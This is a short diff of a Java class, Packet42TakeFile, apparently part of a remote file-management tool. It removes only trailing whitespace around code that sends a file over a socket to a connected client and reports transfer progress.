@@ -16,7 +16,7 @@ public class Packet42TakeFile extends AbstractOutgoingPacket {
 	private String dir;
 	private String name;
 	private File file;
-	
+
 	public Packet42TakeFile(String dir, String name, File file) {
 		this.dir = dir;
 		this.name = name;
@@ -30,7 +30,7 @@ public class Packet42TakeFile extends AbstractOutgoingPacket {
 
 		final FrameFileTransfer frame = FrameFileTransfer.instance;
 		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
-		
+
 		FileIO fileio = new FileIO();
 		fileio.writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), new TransferListener() {
 			public void transferred(long sent, long bytesSent, long totalBytes) {
